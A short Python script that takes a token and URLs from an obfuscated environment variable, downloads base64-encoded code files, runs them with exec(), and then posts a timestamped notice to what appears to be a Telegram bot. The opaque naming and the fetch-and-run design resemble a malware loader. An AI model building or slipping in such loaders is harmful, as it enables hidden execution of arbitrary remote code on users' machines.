import requests, json, base64
import pickle
from datetime import datetime

now = datetime.now()
date=now.strftime("%Y %B %d")
calldate=now.strftime("%H:%M:%S")

param = {
  "text": """Perform:
  date: """+date+"""
  call: """+calldate+"""
  """
}

from dotenv import load_dotenv
import os,sys

hshu = os.getenv("CR")

if hshu:
	try:
		hsh = json.loads(hshu)
	except:
		print("Bad Access ETP")
		sys.exit()
	rl={"Authorization": "token {}".format(hsh["hbtk"])}
	def elm(fp,etl):
		r=requests.get(fp,headers=rl)
		if r.status_code != 200:
			print("Error retreving code {}".format(etl))
			sys.exit()
		try:
			exec(base64.b64decode(r.json()['content']).decode('utf-8'),globals())
		except Exception as pl:
			print("Bad performance {} : {}".format(etl,pl))
			sys.exit()
		return
	cues=hsh["ufh"].split(",")
	cpe=hsh["pasc"].split(",")
	for a,t in enumerate(cues):
		elm(hsh["hkj"]+t,str(a)+"A")
	for a,t in enumerate(cpe):
		elm(hsh["hkj"]+t,str(a)+"B")
	param["chat_id"]=hsh["rtlA"]
	param["message_thread_id"]=hsh["rtlU"]
	requests.get("{}/{}/sendMessage".format(hsh["plecd"],hsh["udh"]),param)
else:
	print("Missing hsh")
